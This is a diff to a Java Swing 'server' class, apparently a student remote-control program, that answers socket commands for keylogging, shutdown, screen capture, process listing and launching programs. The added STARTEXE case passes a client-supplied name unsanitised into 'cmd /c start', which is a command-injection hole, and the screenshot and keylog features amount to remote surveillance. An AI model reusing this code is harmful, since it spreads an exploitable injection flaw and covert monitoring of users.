@@ -15,8 +15,10 @@ import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.awt.image.RenderedImage;
+import java.io.BufferedOutputStream;
 import java.io.BufferedWriter;
 import java.io.ByteArrayOutputStream;
+import java.io.DataOutputStream;
 import java.io.ObjectOutputStream;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
@@ -109,7 +111,6 @@ public class server extends javax.swing.JFrame {
                {
                     case "KEYLOG" -> keylog();
                     case "SHUTDOWN" -> shutdown();
-                    case "REGISTRY" -> registry();
                     case "TAKEPIC" -> takepic();
                     case "PROCESS" -> process();
                     case "APPLICATION" -> application();
@@ -186,7 +187,8 @@ public class server extends javax.swing.JFrame {
             receiveSignal();
             switch(program.signal)
             {
-                case "XEM" ->                 {
+                case "XEM" ->                 
+                {
                     try {
                         String line = null;
                         Process p = Runtime.getRuntime().exec("powershell.exe Get-Process | Where-Object { $_.MainWindowTitle } | Format-Table ID,Name,Mainwindowtitle –AutoSize");
@@ -201,14 +203,15 @@ public class server extends javax.swing.JFrame {
                         program.os.newLine();
                         program.os.flush();
                         Process p1 = Runtime.getRuntime().exec("powershell.exe Get-Process | Where-Object { $_.MainWindowTitle } | Format-Table ID,Name,Mainwindowtitle –AutoSize");
-                        BufferedReader input1 = new BufferedReader(new InputStreamReader(p1.getInputStream())); 
-                        try (ObjectOutputStream out = new ObjectOutputStream(program.sserver.getOutputStream())) {
+                        BufferedReader input1 = new BufferedReader(new InputStreamReader(p1.getInputStream()));
+                        ObjectOutputStream out = new ObjectOutputStream(program.sserver.getOutputStream());
+                        try {
                             for(int i = 0; (i<soprocess) ;i++) {
                                 line = input1.readLine();
                                 line = line.trim();
                                 if (i>=3) 
                                 {
-                                    if (i == soprocess-1)
+                                    if (i == soprocess-2)
                                     {
                                         break;
                                     }
@@ -220,26 +223,45 @@ public class server extends javax.swing.JFrame {
                                 }
                             }
                         }
-                    }
                     catch(IOException e)
                     {
                       JOptionPane.showMessageDialog(null,e);
                     }
+                    }catch(IOException e)
+                    {
+                      JOptionPane.showMessageDialog(null,e);
+                    }
                 }
-                  case "QUIT" -> {
+                case "START" -> {
+                    boolean work = true;
+                    while (work) {
+                        receiveSignal();
+                        switch(program.signal)
+                        {
+                            case "STARTEXE" -> {
+                                String exe = program.is.readLine();
+                                try {
+                                    Process child = Runtime.getRuntime().exec("cmd /c start "+exe+".exe");
+                                } catch (IOException ex) {
+                                    JOptionPane.showMessageDialog(rootPane, "Không thể chạy " + exe +".exe này");
+                                }
+                            }
+                            case "QUIT" -> {
+                                work = false;
+                                break;
+                            }
+                        }
+                    }
+                }
+                      case "QUIT" -> {
                       indo = false;
-                      return;
+                      break;
                 }
             }
         }
     }
-    
-    public void registry()
-    {
-        String ss = null;
-    }
-    
-    public void process()
+   
+    public void process() throws IOException
     {
         boolean indo = true;
         while (indo)
@@ -262,10 +284,12 @@ public class server extends javax.swing.JFrame {
                         program.os.newLine();
                         program.os.flush();
                         Process p1 = Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe");
-                        BufferedReader input1 = new BufferedReader(new InputStreamReader(p1.getInputStream())); 
-                        try (ObjectOutputStream out = new ObjectOutputStream(program.sserver.getOutputStream())) {
+                        BufferedReader input1 = new BufferedReader(new InputStreamReader(p1.getInputStream()));
+                        ObjectOutputStream out = new ObjectOutputStream(program.sserver.getOutputStream());
+                        try {
                             for(int i = 0; (i<soprocess) ;i++) {
                                 line = input1.readLine();
+                                line = line.trim();
                                 if (i>=3)
                                 {
                                     for (int u =0; u < line.length()-2;u++)
@@ -275,28 +299,54 @@ public class server extends javax.swing.JFrame {
                                             line = line.substring(0,u+1)+"_"+line.substring(u+2,line.length());
                                         }
                                     }
-                                    String[] splitline = line.trim().split("\\s{1,100}");
+                                    String[] splitline = line.split("\\s{1,100}");
                                     String data[] = {splitline[0],splitline[1],splitline[2],splitline[3],splitline[4]+splitline[5]};
                                     out.writeObject(data);
                                     out.flush();
                                 }
                             }
+                        }catch(IOException e)
+                        {
+                          JOptionPane.showMessageDialog(null,e);
                         }
+                        
                     }
                     catch(IOException e)
                     {
                       JOptionPane.showMessageDialog(null,e);
                     }
                 }
+                case "START" -> {
+                    boolean work = true;
+                    while (work) {
+                        receiveSignal();
+                        switch(program.signal)
+                        {
+                            case "STARTEXE" -> {
+                                String exe = program.is.readLine();
+                                try {
+                                    Process child = Runtime.getRuntime().exec("cmd /c start "+exe+".exe");
+                                } catch (IOException ex) {
+                                    JOptionPane.showMessageDialog(rootPane, "Không thể chạy " + exe +".exe này");
+                                }
+                            }
+                            case "QUIT" -> {
+                                work = false;
+                                break;
+                            }
+                        }
+                    }
+                }
                   case "QUIT" -> {
                       indo = false;
-                      return;
+                      break;
                 }
             }
         }
     }
-public void takepic()
+public void takepic() throws IOException
     {
+        ByteArrayOutputStream ous = new ByteArrayOutputStream();
         boolean indo = true;
         while (indo)
         {
@@ -305,20 +355,16 @@ public void takepic()
             {
                 case "TAKE" ->                 {
                     try{
-                        robot = new Robot();
-                        ByteArrayOutputStream ous = new ByteArrayOutputStream();
-                        bimg = robot.createScreenCapture(new Rectangle(0,0,(int) d.getWidth(), (int) d.getHeight()));
-                        ImageIO.write(bimg, "png", program.sserver.getOutputStream());
-                        program.sserver.getOutputStream().write(ous.toByteArray());
+                        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+                        ImageIO.write(image, "png", program.sserver.getOutputStream());
                         ous.flush();
-                        break;
                     } catch(Exception ex){
                             JOptionPane.showMessageDialog(null,ex);
                     }
                 }
                 case "QUIT" ->                 {
                     indo = false;
-                    return;
+                    break;
                 }
             }
         }
@@ -357,15 +403,11 @@ public void takepic()
                 }
                 case "QUIT" ->                 {
                     indo = false;
-                    return;
+                    break;
                 }
             }
         }
     }
-    private Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
-    private Image newimg;
-    private Robot robot;
-    private static BufferedImage bimg;
     // Variables declaration - do not modify//GEN-BEGIN:variables
     private javax.swing.JButton Server;
     // End of variables declaration//GEN-END:variables
